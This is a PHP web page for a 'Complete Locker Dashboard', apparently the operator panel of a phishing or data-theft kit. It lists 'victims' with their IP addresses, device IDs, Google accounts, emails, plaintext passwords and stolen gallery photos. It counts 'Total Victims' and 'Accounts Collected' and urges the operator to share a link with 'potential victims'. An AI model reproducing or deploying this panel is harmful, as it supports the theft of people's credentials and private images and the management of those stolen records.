<?php
// Start session
session_start();

// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "virous_data";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Function to sanitize output
function sanitizeOutput($data) {
    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
}

// Delete record if requested
if (isset($_GET['delete']) && is_numeric($_GET['delete'])) {
    $id = intval($_GET['delete']);
    $stmt = $conn->prepare("DELETE FROM victim_data WHERE id = ?");
    $stmt->bind_param("i", $id);
    $stmt->execute();
    $stmt->close();
    
    // Redirect to remove the delete parameter from URL
    header("Location: complete_locker_dashboard.php");
    exit;
}

// View details if requested
$viewDetails = false;
$detailsData = null;

if (isset($_GET['view']) && is_numeric($_GET['view'])) {
    $id = intval($_GET['view']);
    $stmt = $conn->prepare("SELECT * FROM victim_data WHERE id = ?");
    $stmt->bind_param("i", $id);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows > 0) {
        $viewDetails = true;
        $detailsData = $result->fetch_assoc();
    }
    
    $stmt->close();
}

// Get all records for the main table
$sql = "SELECT id, device_id, ip_address, google_account, email, timestamp FROM victim_data ORDER BY timestamp DESC";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Complete Locker Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        
        h1, h2, h3 {
            color: #2c3e50;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            flex: 1;
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .stat-card h3 {
            margin-top: 0;
            color: #6c757d;
            font-size: 16px;
        }
        
        .stat-card p {
            margin-bottom: 0;
            font-size: 24px;
            font-weight: bold;
            color: #343a40;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #f8f9fa;
            font-weight: bold;
            color: #495057;
        }
        
        tr:hover {
            background-color: #f1f1f1;
        }
        
        .actions {
            display: flex;
            gap: 10px;
        }
        
        .btn {
            display: inline-block;
            padding: 8px 12px;
            background-color: #007bff;
            color: white;
            text-decoration: none;
            border-radius: 4px;
            font-size: 14px;
            border: none;
            cursor: pointer;
        }
        
        .btn-danger {
            background-color: #dc3545;
        }
        
        .btn-secondary {
            background-color: #6c757d;
        }
        
        .btn:hover {
            opacity: 0.9;
        }
        
        .details {
            background-color: #f8f9fa;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        
        .details h2 {
            margin-top: 0;
            border-bottom: 1px solid #ddd;
            padding-bottom: 10px;
        }
        
        .detail-row {
            display: flex;
            margin-bottom: 10px;
        }
        
        .detail-label {
            font-weight: bold;
            width: 200px;
            color: #495057;
        }
        
        .detail-value {
            flex: 1;
        }
        
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
            margin-top: 20px;
        }
        
        .gallery-item {
            border: 1px solid #ddd;
            border-radius: 4px;
            overflow: hidden;
        }
        
        .gallery-item img {
            width: 100%;
            height: auto;
            display: block;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #6c757d;
        }
        
        .back-link {
            display: inline-block;
            margin-bottom: 20px;
            color: #007bff;
            text-decoration: none;
        }
        
        .back-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Complete Locker Dashboard</h1>
            <a href="share_link.html" class="btn">Share Link</a>
        </div>
        
        <?php if ($viewDetails): ?>
            <a href="complete_locker_dashboard.php" class="back-link">← Back to Dashboard</a>
            
            <div class="details">
                <h2>Victim Details</h2>
                
                <div class="detail-row">
                    <div class="detail-label">ID:</div>
                    <div class="detail-value"><?php echo sanitizeOutput($detailsData['id']); ?></div>
                </div>
                
                <div class="detail-row">
                    <div class="detail-label">Device ID:</div>
                    <div class="detail-value"><?php echo sanitizeOutput($detailsData['device_id']); ?></div>
                </div>
                
                <div class="detail-row">
                    <div class="detail-label">IP Address:</div>
                    <div class="detail-value"><?php echo sanitizeOutput($detailsData['ip_address']); ?></div>
                </div>
                
                <div class="detail-row">
                    <div class="detail-label">User Agent:</div>
                    <div class="detail-value"><?php echo sanitizeOutput($detailsData['user_agent']); ?></div>
                </div>
                
                <div class="detail-row">
                    <div class="detail-label">Google Account:</div>
                    <div class="detail-value"><?php echo sanitizeOutput($detailsData['google_account']); ?></div>
                </div>
                
                <div class="detail-row">
                    <div class="detail-label">Email:</div>
                    <div class="detail-value"><?php echo sanitizeOutput($detailsData['email']); ?></div>
                </div>
                
                <div class="detail-row">
                    <div class="detail-label">Password:</div>
                    <div class="detail-value"><?php echo sanitizeOutput($detailsData['passwords']); ?></div>
                </div>
                
                <div class="detail-row">
                    <div class="detail-label">Timestamp:</div>
                    <div class="detail-value"><?php echo sanitizeOutput($detailsData['timestamp']); ?></div>
                </div>
                
                <?php if (!empty($detailsData['gallery_data'])): ?>
                    <h3>Gallery Data</h3>
                    <div class="gallery">
                        <?php 
                        $galleryData = json_decode($detailsData['gallery_data'], true);
                        if (is_array($galleryData)) {
                            foreach ($galleryData as $image) {
                                if (isset($image['dataUrl'])) {
                                    echo '<div class="gallery-item">';
                                    echo '<img src="' . $image['dataUrl'] . '" alt="Gallery Image">';
                                    echo '</div>';
                                }
                            }
                        }
                        ?>
                    </div>
                <?php else: ?>
                    <p>No gallery data available.</p>
                <?php endif; ?>
            </div>
            
            <a href="complete_locker_dashboard.php?delete=<?php echo $detailsData['id']; ?>" class="btn btn-danger" onclick="return confirm('Are you sure you want to delete this record?');">Delete Record</a>
            
        <?php else: ?>
            <div class="stats">
                <div class="stat-card">
                    <h3>Total Victims</h3>
                    <p><?php echo $result->num_rows; ?></p>
                </div>
                
                <div class="stat-card">
                    <h3>Accounts Collected</h3>
                    <p>
                        <?php 
                        $accountsQuery = "SELECT COUNT(*) as count FROM victim_data WHERE email != '' AND passwords != ''";
                        $accountsResult = $conn->query($accountsQuery);
                        $accountsRow = $accountsResult->fetch_assoc();
                        echo $accountsRow['count'];
                        ?>
                    </p>
                </div>
                
                <div class="stat-card">
                    <h3>Gallery Data Collected</h3>
                    <p>
                        <?php 
                        $galleryQuery = "SELECT COUNT(*) as count FROM victim_data WHERE gallery_data != ''";
                        $galleryResult = $conn->query($galleryQuery);
                        $galleryRow = $galleryResult->fetch_assoc();
                        echo $galleryRow['count'];
                        ?>
                    </p>
                </div>
            </div>
            
            <?php if ($result->num_rows > 0): ?>
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Device ID</th>
                            <th>IP Address</th>
                            <th>Google Account</th>
                            <th>Email</th>
                            <th>Timestamp</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php while($row = $result->fetch_assoc()): ?>
                            <tr>
                                <td><?php echo sanitizeOutput($row['id']); ?></td>
                                <td><?php echo sanitizeOutput($row['device_id']); ?></td>
                                <td><?php echo sanitizeOutput($row['ip_address']); ?></td>
                                <td><?php echo sanitizeOutput($row['google_account']); ?></td>
                                <td><?php echo sanitizeOutput($row['email']); ?></td>
                                <td><?php echo sanitizeOutput($row['timestamp']); ?></td>
                                <td class="actions">
                                    <a href="complete_locker_dashboard.php?view=<?php echo $row['id']; ?>" class="btn">View</a>
                                    <a href="complete_locker_dashboard.php?delete=<?php echo $row['id']; ?>" class="btn btn-danger" onclick="return confirm('Are you sure you want to delete this record?');">Delete</a>
                                </td>
                            </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            <?php else: ?>
                <div class="empty-state">
                    <h2>No data collected yet</h2>
                    <p>Share the link with potential victims to start collecting data.</p>
                    <a href="share_link.html" class="btn">Share Link</a>
                </div>
            <?php endif; ?>
        <?php endif; ?>
    </div>
</body>
</html>

<?php
// Close connection
$conn->close();
?>